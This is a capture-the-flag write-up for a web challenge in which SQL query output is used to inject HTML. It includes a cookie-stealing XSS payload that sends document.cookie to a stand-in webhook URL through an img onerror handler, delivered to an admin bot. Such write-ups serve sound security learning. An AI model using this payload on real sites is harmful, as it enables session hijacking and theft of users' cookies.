### Chall Desc
I've made a little website to access a SQL database. I even added a way to share your queries with other people! Just copy the link.
Hint1: The contents of the database will give you some info on what to do next.
Hint2: You can only change the query; can you inject arbitrary HTML with it?

## Analyzing the website

We are given a query input field where we can input sql statements.We can `sqlite_master` table to get the structure of the database and the tables.  

![sql schema](https://github.com/ckc1404/CTF_writeups/blob/main/BCACTF/WEB/Query%20Service/schema.png)

We see a notes table and we try seeing the contents of it as well.  

![notes table](https://github.com/ckc1404/CTF_writeups/blob/main/BCACTF/WEB/Query%20Service/notes.png)  

It gives us a link to a admin bot which has the flag as the cookie and this seems like a XSS challenge now.  

We can inject html into the field using the below command  

Command --> `select "<img src=x onerror=this.src='https://webhook_url/?cookie='+document.cookie;>"`

Giving the link of the submitted page to the admin bot gives us requests in the webhook page which we have opened.

![admin bot](https://github.com/ckc1404/CTF_writeups/blob/main/BCACTF/WEB/Query%20Service/admin_bot.png)

We get the flag the cookie section in the webhook request.  

![flag_output](https://github.com/ckc1404/CTF_writeups/blob/main/BCACTF/WEB/Query%20Service/flag.png)

Thank you
